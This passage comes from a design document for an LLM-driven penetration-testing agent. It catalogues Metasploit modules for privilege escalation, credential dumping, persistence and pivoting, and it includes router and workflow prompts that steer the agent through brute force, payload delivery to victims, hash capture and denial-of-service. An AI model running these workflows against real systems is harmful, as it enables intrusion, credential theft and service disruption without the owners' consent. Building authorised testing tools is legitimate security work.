| 4 | **PwnKit (Polkit)** | Polkit pkexec privilege escalation | CVE-2021-4034 | `exploit/linux/local/cve_2021_4034_pwnkit` |
| 5 | **Overlayfs** | Overlayfs privilege escalation | CVE-2021-3493 | `exploit/linux/local/overlayfs_priv_esc` |
| 6 | **Netfilter** | Netfilter local privilege escalation | CVE-2022-25636 | `exploit/linux/local/netfilter_priv_esc_ipv4` |
| 7 | **SUID Binary Exploit** | Abuses misconfigured SUID binaries | N/A | `post/linux/gather/enum_protections` |
| 8 | **Cron Job Exploitation** | Exploits writable cron jobs | N/A | Manual or `post/linux/gather/enum_cron` |

### 10.2 Windows Privilege Escalation

| # | Attack Type | Description | CVE/MS | Metasploit Module |
|---|-------------|-------------|--------|-------------------|
| 9 | **Juicy Potato** | Token impersonation via BITS | MS16-075 | `exploit/windows/local/ms16_075_reflection_juicy` |
| 10 | **Rotten Potato** | Token impersonation via NTLM relay | N/A | `exploit/windows/local/rotten_potato` |
| 11 | **Sweet Potato** | Token impersonation variant | N/A | `exploit/windows/local/sweet_potato` |
| 12 | **Hot Potato** | NBNS/WPAD relay to SYSTEM | N/A | `exploit/windows/local/hot_potato` |
| 13 | **Print Nightmare** | Print Spooler privilege escalation | CVE-2021-34527 | `exploit/windows/local/cve_2021_34527_printnightmare` |
| 14 | **UAC Bypass (fodhelper)** | Bypasses UAC via fodhelper | N/A | `exploit/windows/local/bypassuac_fodhelper` |
| 15 | **UAC Bypass (eventvwr)** | Bypasses UAC via eventvwr | N/A | `exploit/windows/local/bypassuac_eventvwr` |
| 16 | **Service Permissions** | Exploits weak service permissions | N/A | `exploit/windows/local/service_permissions` |
| 17 | **Unquoted Service Path** | Exploits unquoted service paths | N/A | `exploit/windows/local/unquoted_service_path` |
| 18 | **DLL Hijacking** | Plants malicious DLLs | N/A | `exploit/windows/local/dll_*` |
| 19 | **Always Install Elevated** | Exploits MSI installation policy | N/A | `exploit/windows/local/always_install_elevated` |
| 20 | **Getsystem** | Built-in privilege escalation techniques | N/A | `meterpreter > getsystem` |

### 10.3 Post-Exploitation Modules

| # | Category | Description | Metasploit Module |
|---|----------|-------------|-------------------|
| 21 | **Local Exploit Suggester** | Suggests applicable local exploits | `post/multi/recon/local_exploit_suggester` |
| 22 | **Credential Dump (Windows)** | Dumps Windows credentials | `post/windows/gather/credentials/credential_collector` |
| 23 | **Hashdump** | Dumps SAM database hashes | `post/windows/gather/hashdump` |
| 24 | **Mimikatz** | Advanced credential extraction | `post/windows/gather/credentials/mimikatz` |
| 25 | **SSH Key Collection** | Collects SSH keys from Linux | `post/linux/gather/ssh_creds` |
| 26 | **Process Migration** | Moves to higher-privileged process | `post/windows/manage/migrate` |

### 10.4 Persistence Mechanisms

| # | Platform | Description | Metasploit Module |
|---|----------|-------------|-------------------|
| 27 | **Windows Registry** | Registry-based persistence | `post/windows/manage/persistence_exe` |
| 28 | **Windows Service** | Service-based persistence | `exploit/windows/local/persistence_service` |
| 29 | **Windows Scheduled Task** | Task scheduler persistence | `post/windows/manage/scheduled_task` |
| 30 | **Linux Cron** | Cron job persistence | `post/linux/manage/cron_persistence` |
| 31 | **Linux SSH Key** | SSH authorized_keys persistence | `post/linux/manage/sshkey_persistence` |

### 10.5 Pivoting and Lateral Movement

| # | Technique | Description | Metasploit Module/Command |
|---|-----------|-------------|---------------------------|
| 32 | **Port Forwarding** | Forward local port to remote | `meterpreter > portfwd add` |
| 33 | **Route Add** | Add route through session | `msf > route add <subnet> <session>` |
| 34 | **SOCKS Proxy** | Create SOCKS proxy for tunneling | `auxiliary/server/socks_proxy` |
| 35 | **Autoroute** | Automatic routing through sessions | `post/multi/manage/autoroute` |

---

## Agent Routing Architecture

### Proposed Graph Structure

```
                              ┌───────────────────┐
                              │   USER REQUEST    │
                              └─────────┬─────────┘
                                        │
                                        ▼
                              ┌───────────────────┐
                              │   INTENT ROUTER   │
                              │   (New LLM Node)  │
                              └─────────┬─────────┘
                                        │
           ┌────────────────────────────┼────────────────────────────┐
           │            │               │               │            │
           ▼            ▼               ▼               ▼            ▼
    ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐
    │ CVE-BASED│ │BRUTE FORCE│ │ SOCIAL   │ │   DoS    │ │ CAPTURE  │
    │  CHAIN   │ │  CHAIN   │ │  CHAIN   │ │  CHAIN   │ │  CHAIN   │
    └────┬─────┘ └────┬─────┘ └────┬─────┘ └────┬─────┘ └────┬─────┘
         │            │             │            │            │
         ▼            ▼             ▼            ▼            ▼
    ┌──────────────────────────────────────────────────────────────┐
    │                     EXPLOITATION PHASE                        │
    │                 (Chain-specific workflows)                    │
    └──────────────────────────────────────────────────────────────┘
                                        │
                    ┌───────────────────┼───────────────────┐
                    │                   │                   │
                    ▼                   ▼                   ▼
             ┌──────────┐       ┌──────────┐        ┌──────────┐
             │ SESSION  │       │ CREDS    │        │   NONE   │
             │ ACQUIRED │       │ CAPTURED │        │(DoS/Fuzz)│
             └────┬─────┘       └────┬─────┘        └────┬─────┘
                  │                  │                   │
                  ▼                  ▼                   ▼
    ┌───────────────────┐ ┌───────────────────┐ ┌───────────────────┐
    │ POST-EXPLOITATION │ │  CHAIN TO OTHER   │ │    COMPLETE       │
    │     (Statefull)   │ │  ATTACK PATH      │ │    (Report)       │
    └───────────────────┘ └───────────────────┘ └───────────────────┘
```

### Intent Router Implementation

The Intent Router is a new LLM-powered node that determines which attack chain to follow.

```python
# Proposed addition to prompts.py

INTENT_ROUTER_PROMPT = """Analyze the user request and determine the attack path category.

## User Request
{user_request}

## Available Target Information
{target_info}

## Attack Path Categories

| Category | Keywords | Entry Module Pattern |
|----------|----------|---------------------|
| cve_exploit | CVE-, MS17-, exploit, vulnerability, pwn, hack | exploit/* |
| brute_force | brute, password, credential, login, crack, spray | execute_hydra (THC Hydra) |
| social_engineering | phish, social, email, campaign, usb, malicious | auxiliary/server/* or exploit/multi/handler |
| dos_attack | dos, denial, crash, disrupt, flood | auxiliary/dos/* |
| fuzzing | fuzz, crash, discover, overflow, bug | auxiliary/fuzzers/* |
| credential_capture | capture, harvest, intercept, sniff, ntlm, hash | auxiliary/server/capture/* |
| wireless_attack | wireless, wifi, arp, spoof, poison, mitm | auxiliary/spoof/* |
| web_attack | web, http, sql injection, directory, lfi, rfi | auxiliary/scanner/http/* |
| client_side | browser, client, java, pdf, document, drive-by | exploit/*/browser/* |
| local_privesc | privilege, escalate, root, system, local | exploit/*/local/* or post/* |

## Output Format

```json
{
    "detected_category": "<category_name>",
    "confidence": <0.0-1.0>,
    "reasoning": "<why this category>",
    "entry_command": "<first metasploit command>",
    "requires_post_exploitation": <true/false>,
    "required_user_input": ["<list of info needed from user>"]
}
```
"""
```

### Chain-Specific Workflow Prompts

Each attack category needs its own workflow guidance in the system prompt. CVE exploit and brute force paths are fully implemented. The no-module fallback workflow is also complete:

```python
# Chain-specific guidance (implemented paths marked ✅)

CHAIN_WORKFLOWS = {
    "cve_exploit": CVE_EXPLOIT_TOOLS,  # ✅ Implemented
    # + NO_MODULE_FALLBACK_STATEFULL / NO_MODULE_FALLBACK_STATELESS (✅ auto-injected when MSF search fails)

    "brute_force": """  # ✅ Implemented as HYDRA_BRUTE_FORCE_TOOLS (THC Hydra)
## Hydra Brute Force Workflow

1. Select protocol from service table (ssh, ftp, rdp, smb, mysql, etc.)
2. Build Hydra command with project-configured flags (-t, -f, -e, -V, etc.)
3. Execute via `execute_hydra`: `-l <user> -P <wordlist> <flags> <protocol>://<target>`
4. Parse output for `[port][protocol] host: ... login: ... password: ...`
5. If credentials found → establish session via kali_shell (sshpass) or metasploit_console (psexec)
6. If failed → retry with different wordlist strategy (up to HYDRA_MAX_WORDLIST_ATTEMPTS)

**Note**: Uses `execute_hydra` NOT `metasploit_console`. Hydra is stateless — runs and exits.
""",

    "social_engineering": """
## Social Engineering Workflow

### Option A: Payload + Handler
1. Generate payload (msfvenom)
2. `use exploit/multi/handler`
3. `set PAYLOAD <matching_payload>`
4. `set LHOST/LPORT`
5. `exploit -j` (background job)
6. Deliver payload to victim

### Option B: Web Delivery
1. `use exploit/multi/script/web_delivery`
2. `set TARGET <type>`
3. `set PAYLOAD <payload>`
4. `set LHOST/LPORT`
5. `exploit -j`
6. Send generated URL to victim
""",

    "dos_attack": """
## DoS Attack Workflow

1. `use auxiliary/dos/<protocol>/<module>`
2. `show options`
3. `set RHOSTS <target>`
4. `set RPORT <port>`
5. `run`

**Note**: DoS does NOT provide post-exploitation. Mark complete after run.
""",

    "credential_capture": """
## Credential Capture Workflow

1. `use auxiliary/server/capture/<protocol>`
2. `set SRVHOST 0.0.0.0`
3. `set JOHNPWFILE /tmp/hashes`
4. `run -j` (background)
5. Optionally: Force auth via NBNS/LLMNR spoofing
6. Crack captured hashes offline
""",

    "local_privesc": """
## Local Privilege Escalation Workflow

Prerequisites: Active session required!

1. `run post/multi/recon/local_exploit_suggester`
2. Review suggested exploits
3. `use exploit/*/local/<suggested_module>`
4. `set SESSION <session_id>`
5. `set LHOST/LPORT` (for new session)
6. `exploit`
""",
}
```

---

## Post-Exploitation Considerations

### Post-Exploitation Decision Matrix

| Attack Category | Session Possible? | Post-Expl Type | Transition? |
|----------------|-------------------|----------------|-------------|
| CVE Exploit | Yes | Statefull/Stateless | Yes |
| Brute Force | Sometimes (SSH) | Statefull | Yes |
| Social Engineering | Yes (if payload runs) | Statefull | Yes |
| DoS | No | N/A | No |
| Fuzzing | No | N/A | No |
| Credential Capture | Indirect (chain) | N/A | No (chain) |
| Wireless | Sometimes | Statefull | Sometimes |
| Web Attack | Sometimes | Varies | Sometimes |
| Client-Side | Yes | Statefull | Yes |
| Local PrivEsc | Already in post | N/A | N/A |

### Chaining Attack Paths

Some attack paths naturally chain into others:

```
┌─────────────────────────────────────────────────────────────────┐
│                    ATTACK PATH CHAINING                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Credential Capture ──┬──► Brute Force (with captured users)    │
│                       └──► Pass-the-Hash (with NTLM hashes)     │
│                                                                  │
│  Brute Force (SSH) ──────► Post-Exploitation (shell session)    │
│                                                                  │
│  Web Attack ─────────┬──► CVE Exploit (if vuln discovered)      │
│                      └──► SQL Injection (data exfil)            │
│                                                                  │
│  Fuzzing ────────────────► CVE Research (if crash found)        │
│                                                                  │
│  Initial Access ─────────► Local PrivEsc ──► Persistence        │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## Implementation Roadmap

### Phase 1: Intent Router (COMPLETED)
- [x] LLM-based intent classification via `_classify_attack_path()` in `orchestrator.py`
- [x] `ATTACK_PATH_CLASSIFICATION_PROMPT` in `prompts/classification.py`
- [x] `AttackPathClassification` Pydantic model in `state.py`
- [x] Returns both `attack_path_type` and `required_phase`
- [x] `secondary_attack_path` field for fallback classification
- [x] Retry logic with exponential backoff for resilience

### Phase 2: Chain-Specific Workflows (COMPLETED for brute_force_credential_guess)
- [x] Created `HYDRA_BRUTE_FORCE_TOOLS` prompt (`prompts/brute_force_credential_guess_prompts.py`) — THC Hydra replaces Metasploit auxiliary scanners
- [ ] Create `DOS_TOOLS` prompt
- [ ] Create `CAPTURE_TOOLS` prompt
- [ ] Create `SOCIAL_ENGINEERING_TOOLS` prompt
- [x] Updated `get_phase_tools()` to route based on `attack_path_type`
- [x] Dynamic tool routing from DB-driven `TOOL_PHASE_MAP` (replaces hardcoded tool lists)
- [x] Tool Registry (`prompts/tool_registry.py`) as single source of truth for tool metadata

### Phase 2.5: No-Module Fallback Workflows (COMPLETED)
- [x] `NO_MODULE_FALLBACK_STATEFULL` — when `search CVE-*` returns no MSF module, guides agent to exploit manually using `execute_curl`, `execute_code`, `kali_shell`, or `execute_nuclei` to establish a session
- [x] `NO_MODULE_FALLBACK_STATELESS` — same, but for stateless mode (prove RCE only, no session needed)
- [x] Conditional injection: fallback prompt only loaded after MSF search failure (saves ~1,100-1,350 tokens per iteration when a module IS found)
- [x] Multi-tool exploitation: `execute_nuclei` (CVE templates), `execute_curl` (HTTP probing), `execute_code` (Python/bash scripts without shell escaping), `kali_shell` (PoC downloads, msfvenom, searchsploit)

### Phase 2.6: Expanded Kali Tooling (COMPLETED)
- [x] New MCP tools: `execute_nmap` (deep scanning, NSE scripts), `execute_nuclei` (CVE verification), `kali_shell` (general Kali shell), `execute_code` (code execution without shell escaping)
- [x] Consolidated MCP servers: `curl_server.py` + `naabu_server.py` → `network_recon_server.py` (port 8000), new `nmap_server.py` (port 8004)
- [x] Kali sandbox expanded: netcat, socat, rlwrap, exploitdb (searchsploit), john, smbclient, sqlmap, jq, gcc/g++/make, perl
- [x] MCP connection retry logic with exponential backoff (5 retries, 10s base delay)

### Phase 3: Dynamic Post-Exploitation Handling (COMPLETED)
- [x] Added `attack_path_type` to state (`AgentState`)
- [x] Created unified `POST_EXPLOITATION_TOOLS_STATEFULL` for both Meterpreter and shell sessions (removed separate `POST_EXPLOITATION_TOOLS_SHELL`)
- [x] Handle chains that don't have post-exploitation (DoS, Fuzzing) - TBD

### Phase 3.5: Token Optimization & Resilience (COMPLETED)
- [x] Compact execution trace formatting: older steps (beyond last 5) omit raw tool output, truncate args/analysis
- [x] Failure loop detection: 3+ consecutive similar failures inject warning forcing agent to pivot strategy
- [x] Conditional prompt injection: no-module fallback, mode matrix, session config only loaded when needed

### Phase 4: Attack Path Chaining
- [ ] Detect when one attack path should chain to another
- [ ] Implement credential hand-off (capture → brute force)
- [ ] Implement vulnerability hand-off (fuzz → CVE exploit)

### Phase 5: Full Graph Routing
- [ ] Implement Intent Router as separate LangGraph node
- [ ] Create chain-specific sub-graphs
- [ ] Implement dynamic routing between chains

---

## Summary Statistics

| Category | Module Count | Example Count |
|----------|--------------|---------------|
| CVE-Based Exploitation | 2,300+ exploits | 55 examples |
| Brute Force / Credential | 30+ modules | 31 examples |
| Social Engineering | 15+ modules | 15 examples |
| DoS / Availability | 50+ modules | 15 examples |
| Fuzzing / Discovery | 20+ modules | 8 examples |
| Credential Capture / MITM | 25+ modules | 21 examples |
| Wireless / Network | 15+ modules | 12 examples |
| Web Application | 100+ modules | 21 examples |
| Client-Side Exploitation | 50+ modules | 17 examples |
| Local Privilege Escalation | 100+ modules | 35 examples |
| **TOTAL** | **~4,500+ modules** | **230+ examples** |

---

## References

- [Metasploit Framework Documentation](https://docs.rapid7.com/metasploit/)
- [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/)
- [Rapid7 Exploit Database](https://www.rapid7.com/db/)
- [Metasploit Module Library](https://www.infosecmatter.com/metasploit-module-library/)
- [Metasploit Auxiliary Modules Spreadsheet](https://www.infosecmatter.com/metasploit-auxiliary-modules-detailed-spreadsheet/)
- [Post-Exploitation Modules Reference](https://www.infosecmatter.com/post-exploitation-metasploit-modules-reference/)
- [Social Engineering with Metasploit](https://docs.rapid7.com/metasploit/social-engineering/)
- [Brute Force Attacks Documentation](https://docs.rapid7.com/metasploit/bruteforce-attacks/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [CVE Database](https://cve.mitre.org/)

---

*Document Version: 2.1*
*Last Updated: 2026-02-19*
*Author: RedAmon Development Team*
